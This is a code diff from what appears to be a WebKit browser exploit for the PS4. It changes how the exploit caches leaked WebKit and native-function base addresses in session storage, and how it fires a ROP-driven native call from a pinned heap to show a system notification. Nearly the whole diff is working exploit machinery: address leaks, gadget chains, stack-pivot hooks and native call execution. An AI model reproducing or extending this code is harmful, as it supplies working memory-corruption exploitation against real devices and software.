@@ -87,10 +87,10 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     applyPivotHookForFire,
     prepGadgetRvaStale, refreshPrepSlabGadgets,
     CHAIN_POP_ROWS } from "./native_call.js";
-import { runCollatorNotify, pinNotifyHeap } from "./slopkit_notify.js";
+import { fireNotifyPinned, pinNotifyHeap } from "./slopkit_notify.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830bn";
+const BUILD_ID = "rw-20250830bo";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 getpid", title: "getpid — hook cell+0x30 default (13.52; ?hook=cell for poops +0)" },
@@ -4324,16 +4324,18 @@ function resolveWebkitBase(off, nativeFn) {
 /** Pin collator+arena @ PRIMITIVE-OK — skip heavy expm1 slab in notify mode. */
 function ensureNotifyPrep(p, off) {
     if (notifyPrep) return notifyPrep;
-    let nativeFn = null;
-    let webkitBase = null;
-    try {
-        const cap = captureMainMfForPrep(p, off);
-        nativeFn = cap.nativeFn;
-        webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
-        persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
-    } catch (err) {
-        mark("NOTIFY-PREP-SKIP", "base: " + (err.message || String(err)));
-        return null;
+    let nativeFn = parseAddr(sessionStorage.getItem("wk-nativeFn"));
+    let webkitBase = parseAddr(sessionStorage.getItem("wk-webkitBase"));
+    if (!nativeFn || !webkitBase) {
+        try {
+            const cap = captureMainMfForPrep(p, off);
+            nativeFn = cap.nativeFn;
+            webkitBase = nativeFn.sub32(off.wk_expm1_builtin);
+            persistSessionBases(nativeFn, webkitBase, { trust: "rw" });
+        } catch (err) {
+            mark("NOTIFY-PREP-SKIP", "base: " + (err.message || String(err)));
+            return null;
+        }
     }
     notifyPrep = pinNotifyHeap({
         p,
@@ -4348,7 +4350,7 @@ function ensureNotifyPrep(p, off) {
     });
     for (let i = 0; i < notifyRetain.length; i++)
         retained.push(notifyRetain[i]);
-    mark("NOTIFY-PREP", "pinned @ PRIMITIVE-OK — Fire notify after Accept fn");
+    mark("NOTIFY-PREP", "pinned @ PRIMITIVE-OK — Accept fn then Fire notify");
     return notifyPrep;
 }
 
@@ -5176,30 +5178,23 @@ function runFireNotify() {
 
     busy = true;
     nativeQuiet = true;
-    const bases = basesFromSession(off);
     mark("NOTIFY-FIRE", "Collator path build=" + BUILD_ID + " lk=" + lk);
-    mark("NOTIFY-BEGIN", "wk=" + (bases.webkitBase || chainWebkitBase(off) || "?")
-        + " fn=" + (bases.nativeFn || "?"));
     renderOut();
-    try { crashLog.flushSync(); } catch (_) { }
+
+    if (!notifyPrep) {
+        mark("NOTIFY-FAIL", "no pinned prep — close browser, reload ?v=20250830bo&freshprep=1, Start only");
+        state("Start first (need NOTIFY-PIN-OK)", "bad");
+        busy = false;
+        nativeQuiet = false;
+        setUi();
+        renderOut();
+        return;
+    }
 
     try {
-        if (!notifyPrep) {
-            mark("NOTIFY-WARN", "no pinned prep — reload, Start first (before 2e)");
-        }
-        const out = runCollatorNotify({
-            p,
-            off,
-            lk,
-            webkitBase: bases.webkitBase || chainWebkitBase(off),
-            nativeFn: bases.nativeFn,
-            leakval: p.leakval,
-            retain: notifyRetain,
-            params,
-            log: mark,
-            gdScan: params.get("gdscan") === "1",
-            pinned: notifyPrep,
-        });
+        mark("NOTIFY-BEGIN", "pinned fire — 0 stage alloc");
+        renderOut();
+        const out = fireNotifyPinned(p, notifyPrep, lk, off, mark);
         if (out.sent) {
             mark("NOTIFY-OK", "system toast result=0 build=" + BUILD_ID);
             state("notification sent — check PS4 toast", "ok");
